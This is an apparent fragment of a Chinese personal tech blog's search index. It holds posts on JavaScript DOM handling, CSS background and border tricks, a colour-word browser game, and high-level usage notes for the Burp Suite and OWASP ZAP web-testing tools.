addHandler: function(element,type,handler)&#123; if(element.addEventListener)&#123; element.addEventListener(type, handler); &#125; else if (element.attachEvent)&#123; element.attachEvent(type, handler); &#125; else &#123; element[&quot;on&quot; + type] = handler; &#125; &#125;, getEvent: function(event)&#123; return event ? event : window.event; &#125;, getTarget: function(event)&#123; return event.target || event.srcElement; &#125;, preventDefault: function(event)&#123; if(event.preventDefault)&#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, removeHandler: function()&#123; if (element.removeElementListener)&#123; element.removeElementListener(type,handler); &#125; else if (element.detachEvent)&#123; element.detachEvent; &#125; else &#123; element[&quot;on&quot; + type] = null; &#125; &#125;, stopPropagation: function()&#123; if(event.stopPropagation)&#123; event.stopPropagation(); &#125; else&#123; event.cancelBubble = true; &#125; &#125;, getWheelDelta:function(event)&#123; if(event.wheelDelta)&#123; return event.wheelDelta; &#125; else &#123; return -event.detail*40; &#125; &#125;,&#125;;function createLi ()&#123; if(imageCount.length &lt;= 75)&#123; var newImage = new Image(); newImage.src = &quot;rendering/&quot;+imageCount.length + &quot;-&quot; + &quot;.jpg&quot;; newImage.onload = function ()&#123; var ulHeight = [] for(var i=0;i&lt;container.length;i++)&#123; ulHeight.push(container[i].offsetHeight); &#125; var isMinHeight = ulHeight[0]; for(var j=0;j&lt;ulHeight.length;j++)&#123; isMinHeight = Math.min(isMinHeight,ulHeight[j]); &#125; var isMinIndex = ulHeight.indexOf(isMinHeight); var isMinUl = container[isMinIndex]; var newLi = document.createElement(&quot;li&quot;); newLi.className = &quot;itemBox&quot;; newLi.appendChild(newImage); isMinUl.appendChild(newLi); &#125; imageCount.push(1); console.log(imageCount.length) &#125; &#125;for(var k=0;k&lt;15;k++)&#123; createLi()&#125;EventUntil.addHandler(window,&quot;mousewheel&quot;,function(event)&#123; var deltai = EventUntil.getWheelDelta(event); if(deltai&lt;0)&#123; if(document.body.scrollTop||document.documentElement.scrollTop + document.body.clientHeight == document.body.scrollHeight)&#123; for(var k=0;k&lt;15;k++)&#123; createLi() &#125; &#125; &#125; &#125;)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Burpsuite]]></title>
      <url>%2F2016%2F10%2F17%2FBurpsuite%2F</url>
      <content type="text"><![CDATA[0x00 Burpsuite 简介Burpsuite 享有 Web 安全工具中的瑞士军刀的美誉。是由 PortSwigger 公司开发的统一的集成工具用以发现全部现代 Web 安全漏洞。不开源，但是有免费版。免费版不支持主动扫描。 0x01 Proxy 导入证书我们可以在 Burpsuite 应用程序能导出证书。 也可以在浏览器中设置 Burpsuite Proxy 后访问 http://brup 地址获得 证书。 导入证书以后，便可以在使用 Proxy 代理的情况下访问使用 Https 的网站了。 Intercept 截断Burpsuite 在默认情况下会截断所有从客户端发起的请求。 截断客服端请求/服务器端响应设置: 修改响应信息: 匹配和替换:使用匹配和替换功能可以帮助我们去自动的修改请求或者响应的信息，以节省时间成本。 Proxy 中 Invisible 功能Invisible 功能可以使得不支持代理的客户端通过使用 DNS 污染使其转而支持 Burpsuite 代理。 未完待续]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[背景与边框]]></title>
      <url>%2F2016%2F10%2F16%2F%E8%83%8C%E6%99%AF%E4%B8%8E%E8%BE%B9%E6%A1%86%2F</url>
      <content type="text"><![CDATA[0x00 半透明边框 背景知识 RGBA/HSLA 颜色在CSS3里我们可以使用RGBA和HSLA两种色彩模式，二者均可以用来在设置颜色的同时指定其它透明度。RGBA指的是“红色、绿色、蓝色和Alpha透明度”，而HSLA则代表“色调、饱和度、亮度和Alpha透明度”。 在RGBA模式里，前三个参数分别是红色、绿色和蓝色的强度值，取值从 0~255 或 0%~100% （最常见的是 0~255， 而非百分数形式）。而在HSLA模式里，前三个参数则分别代表色调（ 0~360 ）、饱和度（ 0%-100% ）和亮度（ 0%~100% ）。RGBA和HSLA第四个参数都是透明度，取值从0（完全透明）到1（完全不透明）。 CSS3仍有opacity属性，但它的作用是使整个元素都半透明，包括前景内容，而不仅是背景。 解决方案需要知道的是，在默认情况下，背景会延伸到边框所在区域的下层。所以即使我们给边框设置了半透明的效果，那么从视觉上也是无法分辨的。所以,如果我们不希望背景侵入边框所在的范围，就需要使用到 CSS3 的 background-clip 背景切割属性，将它的值设置为 padding-box。 123border: 10px solid hsla(0%, 0%,100%,.5);background:white;background-clip:padding-box; 0x01 多重边框 box-shadow不为人知的是，box-shadow 还可以接受第四个参数(称为”扩展半径”)，通过指定正值或者负值，可以让投影面积加大或者减小。 一个正值的扩展半径加上两个为零的偏移量以及为零的模糊值，得到的投影其实就像是一道实线边框了，在加上 box-shadow 的最大好处，可以支持逗号分隔发法，那么我们便可以为其创建任意数量的投影了。 123456div&#123; height: 200px; width: 200px; background: yellowgreen; box-shadow: 0 0 0 10px #655,0 0 0 15px deeppink, 0 2px 5px 15px rgba(0,0,0, 0.6);&#125; outline有时当我们只需要两层边框的时候，便可以使用 outline 属性来产生外层的边框，这种方案会变得非常灵活，而不同于 box-shadow 只能模拟实现边框。 1234567div&#123; height: 200px; width: 200px; border: 20px solid #655; border-radius: 10px; outline: 5px dashed deeppink; &#125; 描边的另一属性 outline-offset 还可以控制它更元素边缘之间的间距，这个属性可以接受负值。 12345678div&#123; height: 200px; width: 200px; border: 20px solid #655; border-radius: 10px; outline: 5px dashed deeppink; outline-offset: -25px; &#125; 但是，IE8 以下的并不支持 outline-offset 属性。 0x02 背景定位 背景定位有时，我们希望背景图片与容器的边角之间留出一定的空隙(类似内边距的效果)，在 CSS2 的时代要实现这一点是很麻烦的。但是在 CSS3 的时代 background-position 属性已经得到了很好的扩展，并且当结合 background-origin 属性使用时，将发挥出更大的创造力。 在 CSS3 中，background-position 允许我们指定背景图片距离任意角的偏移量，只需我们在偏移量前指定关键字就好了。 需要知道的是，background-position 在默认情况下是以 padding-box 为基准的，不过，我们可以使用 CSS3 中一个新的属性 background-origin 来改变这种默认行为。background-origin 默认值同样为 padding-box，其它可以接受的值是，content-box 和 border-box。 12345678910#box&#123; width:500px; height:500px; border:20px solid rgba(0,0,0,0.5); background: url(img/adver2.jpg) no-repeat ; /*background-clip:content-box; */ background-position: right 20px bottom 10px; background-origin: content-box; padding:40px;&#125; 如此，我们在 background-position 中使用的边角关键字将会以内容区的边缘作为基准。 0x03 边框内圆角一个灵活的方法是使用两个嵌套的 div 来实现边框内圆角的效果。 12345678910#box&#123; background:#655; padding:0.8em;&#125;#subBox &#123; background: tan; padding:0.8em; border-radius:0.8em;&#125; 0x04 条纹背景 背景知识 CSS3 渐变中的百分比在 CSS 渐变属性中使用百分比的作用是指某个颜色距离起点的起始位置。默认的渐变样式为从上往下，所以当某个颜色值设置了百分比后，便会从距离顶端相关的距离（百分比计算）开始填充实色。而渐变是也有空间占比的，渐变过渡区的占比为总的空间(高度或宽度)减去上下两个着色块空间占比剩下的空间。 红色30% 橙色70%的渐变过渡占比为 但若是前面有比当前的颜色值百分比大的，会自动将当前颜色值的百分比设置为前面颜色中的最大百分比值。 此外，默认情况下，还会根据颜色的个数来为每个颜色设置百分比，最后一个颜色的百分比值就是100%，而起始的值就是0%，中间如果再有多个颜色值，则根据100/（个数-1）平均下去。 如此，便可以做出一个简单的多重颜色线条的背景来: 12345678910111213141516171819#box&#123; width:400px; height:200px; background:linear-gradient( red 0, red 14.3%, orange 0, orange 28.6%, yellow 0, yellow 42.9%, green 0, green 57.2%, blue 0, blue 71.5%, indigo 0, indigo 85.8%, purple 0, purple 100%); &#125; 颜色要设置两次，是因为每个颜色需要一个起始着色点，然后还需要将两个颜色之间的渐变过渡区域覆盖为实色，消除过度效果。 水平条纹渐变是一种由代码生成的图像，我们能想对待其他任何背景图像那般来对待他，比如对其使用 background-size 来调整其大小。 12345678910div&#123; width:200px; height: 200px; background:linear-gradient( #fb3 50%, #58a 0 ); background-clip:padding-box; background-size: 20px 100%;&#125; #### 垂直条纹 1234567891011div&#123; width:200px; height: 200px; background:linear-gradient( to right,/*or 90deg*/ #fb3 50%, #58a 0 ); background-clip:padding-box; background-size: 100% 20px;&#125; 斜向条纹1234567891011121314151617div&#123; width:200px; height: 200px; background:linear-gradient( 45deg, #fb3 0, #fb2 25%, #58a 0, #58a 50%, #fb3 0, #fb3 75%, #58a 0, #58a 100% ); background-clip:padding-box; background-size: 20px 20px;&#125; 如果我们需要为背景添加斜向条纹，那么便需要为贴片( 20px,20px)设置完整的色标。不幸的是，这种方法并不完美，当我们尝试改变渐变的角度时，看起来会很糟糕。幸运的是，还有更好的方法来创建斜向条纹，即 repeating-linear-gradient 和 repeating-radial-gradient，循环式的重复渐变。 如此，便再也无须担心如何去创建无缝拼接的贴片。并且，我们会直接在渐变的色标中指定长度，而不是原来的 bakcground-size ，这里的长度是直接在渐变轴上进行度量的，它直接代表了条纹自身的宽度，对渐变来说就是以整个元素的范围进行填充。 1234567891011div&#123; width:200px; height: 200px; background:repeating-linear-gradient( 45deg, #fb3 0, #fb2 15px, #58a 0, #58a 30px ); &#125; 需注意的是在这个方法中，如果我们想要创建双色条纹，那么便需要使用四个色标才行。 同色系条纹123456789101112div&#123; width:200px; height: 200px; background: deeppink; background-image: repeating-linear-gradient( 30deg, hsla(0,0%,100%,0.3), hsla(0,0%,100%,0.3) 15px, transparent 0, transparent 30px ); &#125; 我们首先为其指定了一个主色系的背景颜色，然后把半透明白色的条纹叠加在主色系背景之上得到浅色条纹。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS-DOM(3)-DOM2和DOM3]]></title>
      <url>%2F2016%2F10%2F16%2FJS-DOM(3)-DOM2%E5%92%8CDOM3%2F</url>
      <content type="text"><![CDATA[0x00 DOM2DOM1 主要定义的是 HTML 和 XML 文档的底层结构，DOM2 和 DOM3 则在结构的基础上引入了更多的交互能力，也支持了更高的 XML 特性。 0x02 DOM2级样式HTML 定义样式的三种方式: 外部样式，嵌入式，以及使用 style 特性定义的针对特定元素的样式。 任何支持 style 特性的 HTML 元素都在 JS 中对应一个 style 属性。这个 style 对象是 CSSStyleDeclaration 的实例，包含通过 HTML 的特性指定的所有样式，但是 不包含与经部样式表或者嵌入样式表所设置的样式。 访问元素样式在 JS 中使用 HTML 元素对应的 style 属性时，如果是使用短划线(如: backgroud-color)的 CSS 属性名，必须将其转换成驼峰大小写的形式。 但是，对于 float 属性，直接进行转换也是没有用的，因为 float 是 JS 中的保留字，因此不能用作属性名。DOM2 级中与此对应的属性名是 cssFloat,而 IE 支持的是 styleFloat。 元素大小offset dimension偏移量 (offset dimension), 通过下列4个属性可以取得元素偏移量: offsetHeight: 在垂直方向上占用的空间。包括元素高度，水平滚动的高度，上下边框高度。 offsetWidth: 在水平方向上占用的空间。包括元素宽度，垂直滚动条的, 左右边框的宽带。 offsetLeft: 元素左外边框到父元素的左内边框的像素距离。 offsetTop: 元素上外边框到父元素的上内边框的像素距离。 client dimension元素的客户区大小(client dimension)。指的是元素内容及其内边距所占据的空间的大小。它只有两个属性值: clientWidth: 内容区宽带 + 左右内边距 clientHeight: 内容区高度 + 上下内边距 最常用到这些属性的时候是确定浏览器的窗口大小。要确定浏览器窗口的大小，可以使用 document.documentElement 或者 document.body 的 clientWidth 和 clientHeight scroll scrollHeight: 在没有滚动的情况下，元素内容的总高度 scrollWidth: 在没有滚动的情况下，元内容的中宽带 scrollLeft: 被隐藏在内容区域左侧的像素值。 scrollTop: 被隐藏在内容区域上方的像素值。 document.body.scrollHeight = document.body.scrollTop + document.body.clientHeight滚动区域的高度 = 滚动的距离 + 窗口的高度 使用 scrollTop 回到顶部使用 onscroll() 事件实现图片预加载123456789101112131415161718&lt;img src=&quot;&quot; diy = &quot;../img/1.jpg&quot;&gt;function $(ele)&#123;// 类似于 jQuery 的 $$() return document.querySelector(ele); &#125;var img = $(&quot;img&quot;);var isScrollTop = document.body.scrollTop; document.onscroll = function function_name(argument) &#123; if( isScrollTop + document.documentElement.clientHeight &gt;= 100)&#123; console.log(document.body.scrollTop); var diy = img.getAttribute(&quot;diy&quot;); img.setAttribute(&quot;src&quot;,diy) &#125; &#125; 我们通过对 img 标签设置自定义属性 diy 来预先存储图片路径。需要注意的是 document.body.scrollTop 属性只针对 Chrome 有用，非 Chrome 浏览器需使用 document.documentElement.scrollTop。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS-DOM(2)-DOM扩展]]></title>
      <url>%2F2016%2F10%2F16%2FJS-DOM(2)-DOM%E6%89%A9%E5%B1%95%2F</url>
      <content type="text"><![CDATA[0x00 HTML 扩展 焦点管理使用 HTML5 中的 焦点管理属性 document.activeElement，便始终会引用 DOM 中当前获得了焦点的元素。 默认情况下，页面加载完成时，document.activeElement 中保存的是 body 元素的引用；文档加载期间，保存的值为 null。 此外，document.hasFocus() 可以确定文档是否获得了焦点。 123var button = document.getElementById(&quot;myBtn&quot;);button.focus();alert(document.hasFocus()); 通过此方法，我们可以知道用户是不是正在与页面交互。 元素获得焦点的方式有:页面加载，用户输入（按 tab 键）和在代码中调用 focus() 方法. HTMLDocument 的变化HTML5 扩展了 HTMLDocument ，增加了新的功能功能。 readyState 属性Document 的 readyState 属性可能有两个值: loading,正在加载文档 complete,已经加载完文档 其基本用法: 123if(document.readyState == &quot;complete&quot;)&#123; //body&#125; 自定义数据属性HTML5 规定可以为元素添加非标准的属性，但是要加前缀 data- ,目的是为元素提供与渲染无关的信息，或者提供语义信息。在跟踪链接或者混搭应用中，通过自定义属性能方便的知道来自页面的哪个部分。然后我们可以使用 dataset 属性来访问自定义的属性值。 0x01 内存与性能问题当删除带有事件处理程序或引用其他 JS 对象子树的时候便有可能导致性能问题。所以我们有必要在使用这些属性前手动删除被替换元素的所有事件处理和 JS 对象属性。 不过，使用这几个属性，便利也是显而易见的，比如 innerHTML ,在插入大量 HTML 标记时使用 innerHTML 属性与通过多次 DOM 操作先创建节点在指定它们之间的关系相比，效率要高得多。因为在使用 inerHTML 或者 outerHTML 属性时会先创建一个 HTML 的解析器。该解析器是在浏览器级别基础上运行的。因此比执行 JS 代码要快的多。但是，创建和销毁 HTML 解析器也会带来性能损失，所以最好能将使用 innerHTML 或者 outerHTML 的次数控制在合理范围内。 12345var itemsHtml = &quot;&quot;;for( var i = 0,len = values.length;i &lt; len; i ++)&#123; itemsHtml += &quot;&lt;li&gt; + values[i] + &lt;/li&gt;&quot;;&#125;ul.innerHTML = itemsHtml;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS选字小游戏]]></title>
      <url>%2F2016%2F10%2F14%2F%E9%80%89%E5%AD%97%E5%B0%8F%E6%B8%B8%E6%88%8F%2F</url>
      <content type="text"><![CDATA[0x00 游戏规则请根据上面文字的颜色在下方选择正确的文字. 方法一123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;选字游戏&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0;padding: 0; &#125; #warp&#123; width: 600px;height: 400px;border: 1px solid red;margin: 0 auto;position: relative; &#125; #time&#123; width: 200px;height: 50px;background: red;font-size: 40px;line-height: 40px; position:absolute;left:20px;top: 20px; &#125; #score&#123; width: 50px;height: 50px;position:absolute;top: 20px;right:20px; background:blue;font-size: 50px; &#125; #main&#123; margin: 100px auto;width:100px;height: 100px;font-size: 100px; &#125; #rule&#123; text-align: center; &#125; #list&#123; text-align: center;position: absolute;bottom: 20px;width: 100%; &#125; li&#123; display: inline-block;margin: 0 20px;font-size: 40px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;warp&quot;&gt; &lt;div id=&quot;time&quot;&gt;倒计时30&lt;/div&gt; &lt;div id=&quot;score&quot;&gt;0&lt;/div&gt; &lt;div id=&quot;main&quot;&gt;黑&lt;/div&gt; &lt;div id=&quot;rule&quot;&gt;请根据上面文字的颜色在下方选择正确的文字，正确后游戏开始&lt;/div&gt; &lt;ul id=&quot;list&quot;&gt; &lt;li&gt;红&lt;/li&gt; &lt;li&gt;黄&lt;/li&gt; &lt;li&gt;蓝&lt;/li&gt; &lt;li&gt;绿&lt;/li&gt; &lt;li&gt;黑&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var main = document.getElementById(&quot;main&quot;); var li = document.getElementsByTagName(&quot;li&quot;); var time = document.getElementById(&quot;time&quot;); var fonts = [&quot;红&quot;,&quot;黄&quot;,&quot;蓝&quot;,&quot;绿&quot;,&quot;黑&quot;]; var colors = [&quot;red&quot;,&quot;yellow&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;black&quot;]; var realFont = &quot; &quot;; //改变大字颜色及内容； function changeMain()&#123; var num = rand(colors.length,0) realFont = fonts[num]; main.style.color = colors[num]; main.innerHTML = fonts[rand(fonts.length,0)]; &#125; //改变小字颜色及顺序 ； function changeLI()&#123;// for (var i = 0 ; i&lt; li.length; i++) &#123;// li[i].style.color = colors[rand(5,0)]// &#125;// 目的 改变了colors的顺序 var nColors = [];//定义一个新数组，用来改变colors的顺序 var nFonts = []; while(nColors.length&lt;colors.length)&#123;//当新数组长度小于colors数组长度的时候进入此循环 var num = rand(colors.length,0);//定义一个随机4-0之间的随机数 var num2 = rand(fonts.length,0); var bol = true;//定义bol，判断是否需要推入新数组 for (var i = 0 ; i&lt; nColors.length ; i ++) &#123;//遍历新数组 if (nColors[i] == colors[num]||nFonts[i] == fonts[num2]) &#123;//当新数组中已存在的值与新随机出的颜色值相等时，改变bol值，阻止其推入新数组 bol = false; &#125; &#125; if (bol==true) &#123; nColors.push(colors[num]);//将随机出来的颜色推入新数组 nFonts.push(fonts[num2]); &#125; &#125; for(var i = 0 ; i &lt; nColors.length ; i ++)&#123;//遍历新的数组 li[i].style.color = nColors[i]; li[i].innerHTML = nFonts[i]; &#125; &#125; changeLI() changeMain() var isclick = true; for (var i = 0 ; i&lt;li.length ; i ++) &#123; li[i].onclick = function()&#123; if (isclick) &#123; if (this.innerHTML == realFont) &#123; clearInterval(timer)// alert(&quot;你点对了&quot;) daojishi() changeLI() changeMain() &#125; &#125; &#125; &#125; var timed = 3; var timer = null; function daojishi()&#123; timer = setInterval(function()&#123; timed--; time.innerHTML = &quot;倒计时&quot;+timed; if (timed&lt;=0) &#123; clearInterval(timer) alert(&quot;游戏结束&quot;) isclick = false; &#125; &#125;,1000) &#125; //随机max-1 到min之间的整数 function rand(max,min)&#123; return parseInt(Math.random()*(max-min)+min); &#125; &lt;/script&gt;&lt;/html&gt; 方法二核心代码使用生成的随机数组实现。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;选字游戏&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0;padding: 0; &#125; #warp&#123; width: 600px;height: 400px;border: 1px solid red;margin: 0 auto;position: relative; &#125; #time&#123; width: 200px;height: 50px;background: red;font-size: 40px;line-height: 40px; position:absolute;left:20px;top: 20px; &#125; #score&#123; width: 50px;height: 50px;position:absolute;top: 20px;right:20px; background:blue;font-size: 50px; &#125; #main&#123; margin: 100px auto;width:100px;height: 100px;font-size: 100px; &#125; #rule&#123; text-align: center; &#125; #list&#123; text-align: center;position: absolute;bottom: 20px;width: 100%; &#125; li&#123; display: inline-block;margin: 0 20px;font-size: 40px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;warp&quot;&gt; &lt;div id=&quot;time&quot;&gt;倒计时30&lt;/div&gt; &lt;div id=&quot;score&quot;&gt;0&lt;/div&gt; &lt;div id=&quot;main&quot;&gt;黑&lt;/div&gt; &lt;div id=&quot;rule&quot;&gt;请根据上面文字的颜色在下方选择正确的文字，正确后游戏开始&lt;/div&gt; &lt;ul id=&quot;list&quot;&gt; &lt;li&gt;红&lt;/li&gt; &lt;li&gt;黄&lt;/li&gt; &lt;li&gt;蓝&lt;/li&gt; &lt;li&gt;绿&lt;/li&gt; &lt;li&gt;黑&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var main = document.getElementById(&quot;main&quot;); var lis = document.getElementsByTagName(&quot;li&quot;); var time = document.getElementById(&quot;time&quot;); var fonts = [&quot;红&quot;,&quot;黄&quot;,&quot;蓝&quot;,&quot;绿&quot;,&quot;黑&quot;]; var colors = [&quot;red&quot;,&quot;yellow&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;black&quot;]; var realFont = &quot; &quot;; function getRandomArray (max,min,countNum)&#123; var randomArray = new Array(); for( var i = 0; i &lt; countNum;i ++)&#123; var newNum = parseInt(Math.random()*(max - min +1)+min); exits = false; for( var j =0 ;j &lt; i;j ++)&#123; if(randomArray[j] == newNum)&#123; exits = true; i --; break; &#125; &#125; if(!exits)&#123; randomArray[i] = newNum; &#125; &#125; return randomArray; &#125; function changeMian ()&#123; var newRadomArr = getRandomArray(4,0,5); main.style.color = colors[newRadomArr[3]]; realFont = fonts[newRadomArr[3]]; main.innerHTML = fonts[newRadomArr[2]]; &#125; function changeLi ()&#123; var newRadomArr1 = getRandomArray(4,0,5); var newRadomArr2 = getRandomArray(4,0,5); for(var i = 0;i &lt; lis.length;i ++ )&#123; lis[i].innerHTML = fonts[newRadomArr1[i]]; lis[i].style.color = colors[newRadomArr2[i]]; &#125; &#125; function isRight()&#123; for (var i = lis.length - 1; i &gt;= 0; i--) &#123; lis[i].onclick = function ()&#123; if( this.innerHTML == realFont)&#123; alert(&quot;you are right!&quot;); &#125; &#125; &#125; &#125; changeMian(); changeLi(); isRight(); &lt;/script&gt;&lt;/html&gt; 方法三核心代码使用 数组 Array.sort() 实现。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;选字游戏&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; *&#123; margin: 0;padding: 0; &#125; #warp&#123; width: 600px;height: 400px;border: 1px solid red;margin: 0 auto;position: relative; &#125; #time&#123; width: 200px;height: 50px;background: red;font-size: 40px;line-height: 40px; position:absolute;left:20px;top: 20px; &#125; #score&#123; width: 50px;height: 50px;position:absolute;top: 20px;right:20px; background:blue;font-size: 50px; &#125; #main&#123; margin: 100px auto;width:100px;height: 100px;font-size: 100px; &#125; #rule&#123; text-align: center; &#125; #list&#123; text-align: center;position: absolute;bottom: 20px;width: 100%; &#125; li&#123; display: inline-block;margin: 0 20px;font-size: 40px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;warp&quot;&gt; &lt;div id=&quot;time&quot;&gt;倒计时30&lt;/div&gt; &lt;div id=&quot;score&quot;&gt;0&lt;/div&gt; &lt;div id=&quot;main&quot;&gt;黑&lt;/div&gt; &lt;div id=&quot;rule&quot;&gt;请根据上面文字的颜色在下方选择正确的文字，正确后游戏开始&lt;/div&gt; &lt;ul id=&quot;list&quot;&gt; &lt;li&gt;红&lt;/li&gt; &lt;li&gt;黄&lt;/li&gt; &lt;li&gt;蓝&lt;/li&gt; &lt;li&gt;绿&lt;/li&gt; &lt;li&gt;黑&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var main = document.getElementById(&quot;main&quot;); var lis = document.getElementsByTagName(&quot;li&quot;); var time = document.getElementById(&quot;time&quot;); var fonts = [&quot;红&quot;,&quot;黄&quot;,&quot;蓝&quot;,&quot;绿&quot;,&quot;黑&quot;]; var colors = [&quot;red&quot;,&quot;yellow&quot;,&quot;blue&quot;,&quot;green&quot;,&quot;black&quot;]; var realFont = &quot; &quot;; function getRandomArray ()&#123; var randomArray = new Array(); randomArray = arguments[0].slice(0); randomArray.sort(function()&#123; var num = Math.random() - 0.5; return num; &#125;) return randomArray; &#125; function changeMian ()&#123; var newRadomArr = getRandomArray(colors); var newRadomArr1 = getRandomArray(fonts); main.style.color = newRadomArr[3]; realFont = newRadomArr[3]; main.innerHTML = newRadomArr1[2]; &#125; function changeLi ()&#123; var newRadomArr = getRandomArray(fonts); var newRadomArr1 = getRandomArray(colors); for(var i = 0;i &lt; lis.length;i ++ )&#123; lis[i].innerHTML = newRadomArr[i]; lis[i].style.color = newRadomArr1[i]; &#125; &#125; function isRight()&#123; for (var i = lis.length - 1; i &gt;= 0; i--) &#123; lis[i].onclick = function ()&#123; if( this.innerHTML == realFont)&#123; alert(&quot;you are right!&quot;); &#125; &#125; &#125; &#125; changeMian(); changeLi(); isRight(); &lt;/script&gt;&lt;/html&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[OWASP_ZAP]]></title>
      <url>%2F2016%2F10%2F13%2FOWASP_ZAP%2F</url>
      <content type="text"><![CDATA[0x00 OWASP_ZAPZend attack proxy 是一款 web application 集成渗透测试和漏洞工具，同样是免费开源跨平台的。 OWASP_ZPA 支持截断代理，主动、被动扫描，Fuzzy，暴力破解并且提供 API。 OWASP_ZPA 是Kali Web Top 10 之一。 0x01 截断代理首次启动 OWASP_ZAP 会提示是否将 session 进行保存，以及如何保存。 OWASP_ZAP 默认监听的是 8080 端口，并且在启动 ZAP 的时候便会自动开始监听。 如此，只需设置浏览器代理，ZAP 便会自动爬取所有数据。 0x02 主动扫描ZAP 最简单的使用方式便是在首页直接输入目标 Target 然后点击 攻击 便会开始主动扫描了。 0x03 Fuzzer通过右键选择某个特定页面进行 Fuzzer。 此外，也可以选择工具菜单中的 Fuzz 进行 Fuzzing 。 数据库注入 Fuzzing选择可能存在 SQL 注入的可疑字符串，为其添加 PayLoads 记性 SQL Injection Fuzzing。 fuzzing 完整以后，可以通过 Code ,Size Resp.Header 等字段属性对 fuzzing 的结果进行筛选。 页面目录Fuzzing首先选中需要替换的字符串，然后点击 Fuzz Locations 中的 Add 选中以选择 fuzzing 的方式。 我们可以使用 字符串，脚本，正则表达式，文本文件或 ZAP 自带的 File Fuzzer 去搜索网站目录。 0x04 暴力破解 但是，当我们使用一个字典文件去尝试暴力破解的时候，如何去识别出破解成功与不成功的不同差异，便只有依靠上帝了。 0x05 ZAP 的 APIAPI 是一程序开发的接口。ZAP 提供API 一便让开发者使用ZAP 以定制自己的扫描程序。 ZAP 的 API 使用文档:[ http://zap] 0x06 Mode(扫描模式)ZAP 有四种扫描模式 Safe, Protected, Standard, Attack（攻击似的扫描）。 扫描所得的漏洞数量以次递增。 0x07 Scan Policy (扫描策略)选择特定页面进行 Active Scan : ZAP 继承了一个默认的扫描策略 Default Policy: 当然，我们可以定制自己的扫描策略，在 顶部导航 分析 中的扫描策略(或者Ctrl+P) 打开 Scan Policy Manager 添加或修改自己的扫描策略。 如此，我们便可以在以后的网站扫描配置中选择自定义的扫描策略了。 0x08 Anti CSRF Tokens某些应用程序为了防止 CSR 攻击，在每次访问时都会随机生成一个新的 Token。这些由伪随机算法生成的随机数也许大部分的扫描器都不支持。所以我们可以通过 ZAP 的 Anti CSRF Tokens 功能添加该网站的特定的 Tokens(如果该网站有 Token 的话)。 what’s token?在OAuth协议中，token是在输入了用户名和密码之后获取的，只不过是服务器或者说网站帮你生成的临时密码。利用这个token你可以拥有查看或者操作相应的资源的权限。你有这些权限，是因为服务器知道你是谁（authentication）以后赋予你的，所以token这个东西，其实就是你的一个“代表”，或者说完全能代表你的“通行证”。从这个概念来说，“令牌”这个翻译，真的是非常的“信雅达”啊 0x09 HTTP -CA首先生成并保存 ZAP 的http 证书。 然后在浏览器中导入 ZAP 的根证书。 0x0A ZAP 身份认证在 ZAP 中最常用的 身份认证是使用 HTTP Session 的认证方式。当然 ZAP 也是支持其它认证方式的，并且我们可以在 Session Properities 中进行配置。 由上图可知，目前 ZAP 支持四种身份认证方法: Form,HTTP/NTLM, Manual,Script-based。 默认情况下，一个 Muaual 认证方式就足够了，也是最简单易用的方式。 HTTP SessionZAP 在默认情况下只会将其内置的几个 session 名称识别为 HTTP Session。但是，某些情况下，有的网站也许会自定义自己的 session 名称，这时我们有必要手动为其添加自定义的 session 标识。 0x0B 截断ZAP 可以实时截断从客户端发起的请求或者从服务器端回传的响应。 0x0C 隐藏域以微软搜索引擎 必应为例，未开启隐藏域时访问的眼如下: 开启 ZAP 的隐藏域显示功能: 0x0D 总结标准扫描工作流程: 设置代理 –&gt; 手动爬网 –&gt; 自动爬网 –&gt; 主动扫描.]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS-DOM(1)DOM基础]]></title>
      <url>%2F2016%2F10%2F13%2FJS-DOM(1)DOM%E5%9F%BA%E7%A1%80%2F</url>
